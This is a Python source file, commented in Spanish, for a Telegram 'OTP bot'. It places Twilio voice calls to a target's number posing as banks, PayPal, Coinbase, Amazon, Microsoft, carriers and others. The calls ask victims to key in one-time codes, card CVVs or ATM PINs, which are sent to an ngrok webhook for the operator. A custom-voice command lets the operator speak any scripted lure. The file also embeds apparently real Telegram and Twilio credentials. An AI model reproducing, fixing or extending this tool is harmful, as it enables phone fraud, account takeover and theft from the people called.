import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from twilio.rest import Client

# --- CONFIGURACIÓN ---
# Reemplaza con tus credenciales reales
TELEGRAM_TOKEN = '8555237773:AAHZiG_nqBzGyWshGsXBzCEKnOKmOjxoHLw'
TWILIO_SID = 'AC8c778ba9b59bc0adb2048fcef85000d6'
TWILIO_TOKEN = '7d199ca79a4be9f902dc12909ff8458d'
TWILIO_NUMBER = '+1765663617'
# Tu URL de Ngrok o Cloudflared (Termux)
WEBHOOK_URL = 'https://7c8667387d58.ngrok-free.app/otp-recibido' 

client = Client(TWILIO_SID, TWILIO_TOKEN)

# --- CONFIGURACIÓN DE IDIOMAS Y VOCES ---
IDIOMAS = {
    "mx": {
        "voz": "alice",
        "lenguaje": "es-MX",
        "intro": "Estimado cliente de",
        "final": "para confirmar su identidad y cancelar la transacción no autorizada."
    },
    "us": {
        "voz": "Polly.Joanna",
        "lenguaje": "en-US",
        "intro": "Security alert from",
        "final": "to verify your identity and cancel the unauthorized request."
    }
}

# --- DICCIONARIO MAESTRO DE MÓDULOS ---
MODULOS = {
    "facebook": {"name": "Facebook", "msg_es": "el código de recuperación de Facebook", "msg_en": "your Facebook recovery code", "digits": 6},
    "bank": {"name": "Bank", "msg_es": "el código de verificación de su banca móvil", "msg_en": "your mobile banking verification code", "digits": 6},
    "cvv": {"name": "CVV", "msg_es": "los 3 dígitos de seguridad al reverso de su tarjeta", "msg_en": "the 3 digit security code on the back of your card", "digits": 3},
    "pin": {"name": "PIN", "msg_es": "su clave de cajero de 4 dígitos", "msg_en": "your 4 digit ATM pin", "digits": 4},
    "applepay": {"name": "Apple Pay", "msg_es": "el código de autorización de Apple Pay", "msg_en": "your Apple Pay authorization code", "digits": 6},
    "coinbase": {"name": "Coinbase", "msg_es": "el código de 2 pasos de Coinbase", "msg_en": "your Coinbase 2-step verification code", "digits": 6},
    "crypto": {"name": "Crypto", "msg_es": "el código de transferencia", "msg_en": "your crypto transfer code", "digits": 6},
    "amazon": {"name": "Amazon", "msg_es": "el código de aprobación de Amazon", "msg_en": "your Amazon approval code", "digits": 6},
    "microsoft": {"name": "Microsoft", "msg_es": "el código de acceso de Microsoft", "msg_en": "your Microsoft access code", "digits": 6},
    "paypal": {"name": "PayPal", "msg_es": "el código de seguridad de PayPal", "msg_en": "your PayPal security code", "digits": 6},
    "venmo": {"name": "Venmo", "msg_es": "el código de Venmo", "msg_en": "your Venmo verification code", "digits": 6},
    "cashapp": {"name": "CashApp", "msg_es": "el código de CashApp", "msg_en": "your CashApp login code", "digits": 6},
    "quadpay": {"name": "QuadPay", "msg_es": "el código de QuadPay", "msg_en": "your QuadPay code", "digits": 6},
    "carrier": {"name": "Carrier", "msg_es": "el código de su operadora", "msg_en": "your carrier transfer code", "digits": 6},
    "email": {"name": "Email", "msg_es": "el código enviado a su correo", "msg_en": "the code sent to your email", "digits": 6}
}

# --- FUNCIÓN CENTRAL PARA MÓDULOS ---
async def ejecutar_modulo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    comando = update.message.text.split()[0][1:].lower()
    
    if not context.args:
        await update.message.reply_text(f"❌ Uso: /{comando} <número>")
        return

    numero_destino = context.args[0]
    config = MODULOS.get(comando)
    if not config: return

    # Detección de País
    if numero_destino.startswith("+1"):
        lang = IDIOMAS["us"]
        msg_servicio = config["msg_en"]
    else:
        lang = IDIOMAS["mx"]
        msg_servicio = config["msg_es"]

    await update.message.reply_text(f"📞 [Módulo {config['name'].upper()}]\n🌎 Idioma: {lang['lenguaje']}\n📱 Target: {numero_destino}")

    script_voz = f"{lang['intro']} {config['name']}, por favor ingrese {msg_servicio} {lang['final']}"
    
    twiml_msg = f"""
    <Response>
        <Gather numDigits="{config['digits']}" action="{WEBHOOK_URL}" method="POST">
            <Say language="{lang['lenguaje']}" voice="{lang['voz']}">{script_voz}</Say>
        </Gather>
        <Say language="{lang['lenguaje']}">No recibimos información. Goodbye.</Say>
    </Response>
    """

    try:
        call = client.calls.create(twiml=twiml_msg, to=numero_destino, from_=TWILIO_NUMBER)
        await update.message.reply_text(f"✅ Llamada iniciada. ID: {call.sid}\n⏳ Esperando dígitos...")
    except Exception as e:
        await update.message.reply_text(f"❌ Error Twilio: {e}")

# --- NUEVA MEJORA: COMANDO DE VOZ PERSONALIZADA ---
async def custom_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Uso: /customvoice <número> <mensaje personalizado>
    """
    if len(context.args) < 2:
        await update.message.reply_text("❌ Uso: /customvoice <número> <mensaje personalizado>")
        return

    numero_destino = context.args[0]
    mensaje_personalizado = " ".join(context.args[1:])

    # Detección de idioma simple para la voz personalizada
    if numero_destino.startswith("+1"):
        voz, lang = "Polly.Joanna", "en-US"
    else:
        voz, lang = "alice", "es-MX"

    await update.message.reply_text(f"🗣️ Enviando mensaje personalizado a: {numero_destino}...")

    twiml_custom = f"""
    <Response>
        <Gather numDigits="6" action="{WEBHOOK_URL}" method="POST">
            <Say language="{lang}" voice="{voz}">{mensaje_personalizado}</Say>
        </Gather>
        <Hangup/>
    </Response>
    """

    try:
        client.calls.create(twiml=twiml_custom, to=numero_destino, from_=TWILIO_NUMBER)
        await update.message.reply_text("✅ Llamada personalizada en curso. Esperando código...")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# --- COMANDOS INICIALES ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    menu = (
        "🔥 **OTP BOT PREMIUM** 🔥\n\n"
        "**Módulos Disponibles:**\n"
        " /" + " | /".join(MODULOS.keys()) + "\n\n"
        "**Voz Personalizada:**\n"
        "🗣️ `/customvoice <número> <mensaje>`"
    )
    await update.message.reply_text(menu, parse_mode='Markdown')

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("customvoice", custom_voice))
    
    # Registro automático de todos los módulos
    for cmd in MODULOS.keys():
        app.add_handler(CommandHandler(cmd, ejecutar_modulo))
    
    print("🚀 Bot OTP con CustomVoice activo en Termux...")
    app.run_polling()

if __name__ == "__main__":
    main()
